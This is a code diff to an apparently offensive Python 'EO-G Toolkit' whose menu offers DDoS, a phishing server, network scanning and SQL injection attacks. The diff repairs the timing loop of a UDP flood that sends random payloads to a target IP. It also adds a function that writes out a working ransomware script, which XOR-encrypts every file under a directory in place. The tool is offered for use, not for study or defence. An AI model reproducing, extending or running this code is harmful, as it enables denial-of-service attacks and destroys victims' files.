@@ -3,7 +3,8 @@ import socket
 import random
 import subprocess
 from http.server import SimpleHTTPRequestHandler, HTTPServer
-import requests  # For SQL Injection functionality
+import requests
+import time
 
 
 # Display Banner
@@ -15,7 +16,7 @@ def display_banner():
     ██╔══╝  ██║     ██║   ██║╚════██║
     ███████╗╚██████╗╚██████╔╝███████║
     ╚══════╝ ╚═════╝ ╚═════╝ ╚══════╝
-    EO-G Toolkit with Dynamic Malware Generation
+    EO-G Toolkit with Real-Time Features
     """
     print(banner)
 
@@ -53,9 +54,9 @@ class EOGReal:
         print(f"Starting DDoS attack on {target_ip} for {duration} seconds...")
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         payload = random._urandom(1024)
-        end_time = os.times().elapsed + duration
+        end_time = time.time() + duration
 
-        while os.times().elapsed < end_time:
+        while time.time() < end_time:
             try:
                 sock.sendto(payload, (target_ip, 80))
             except Exception as e:
@@ -93,7 +94,7 @@ class EOGReal:
 
     def detect_nearby_devices(self):
         """
-        Detect nearby devices on the network using ARP ping.
+        Detect nearby devices on the network.
         """
         print("Scanning for nearby devices...")
         try:
@@ -140,6 +141,36 @@ class EOGReal:
         except Exception as e:
             print(f"Error during SQL injection: {e}")
 
+    def generate_malware(self):
+        """
+        Generate simple ransomware malware.
+        """
+        print("Generating ransomware malware...")
+        ransomware_code = """
+import os
+
+key = 0x42
+
+def encrypt_file(file_path):
+    try:
+        with open(file_path, 'rb') as f:
+            data = f.read()
+        encrypted_data = bytes([b ^ key for b in data])
+        with open(file_path, 'wb') as f:
+            f.write(encrypted_data)
+        print(f"Encrypted: {file_path}")
+    except Exception as e:
+        print(f"Error encrypting {file_path}: {e}")
+
+target_directory = "/tmp"
+for root, dirs, files in os.walk(target_directory):
+    for file in files:
+        encrypt_file(os.path.join(root, file))
+"""
+        with open("ransomware.py", "w") as f:
+            f.write(ransomware_code)
+        print("Ransomware script saved as 'ransomware.py'.")
+
 
 # EO-G Control Panel
 def eog_control():
@@ -151,7 +182,8 @@ def eog_control():
         print("3. Phishing Server")
         print("4. Detect Nearby Devices")
         print("5. SQL Injection Attack")
-        print("6. Exit")
+        print("6. Generate Malware")
+        print("7. Exit")
         choice = input("Choose an option: ")
 
         if choice == "1":
@@ -172,6 +204,8 @@ def eog_control():
             target_url = input("Enter the target URL for SQL injection: ")
             agent.sql_injection_attack(target_url)
         elif choice == "6":
+            agent.generate_malware()
+        elif choice == "7":
             print("Exiting EO-G Toolkit.")
             break
         else:
